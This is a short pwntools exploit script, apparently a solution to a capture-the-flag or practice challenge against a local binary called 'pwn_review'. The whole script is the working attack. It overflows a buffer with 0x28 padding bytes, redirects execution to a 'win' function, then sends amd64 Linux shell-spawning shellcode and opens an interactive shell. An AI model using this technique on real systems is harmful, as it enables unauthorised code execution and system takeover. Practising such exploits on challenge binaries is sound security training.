from pwn import *
p = process("../pwn_review")
context.arch = 'amd64'
sc = pwnlib.shellcraft.amd64.linux.sh()
#p = remote("localhost", 31337)
p.recv()
win = p.elf.symbols['win']
payload = ("B" * 0x28).encode("utf-8") + p64(win) 
p.sendline(payload)
print(p.recv())
p.sendline(asm(sc))
p.interactive()

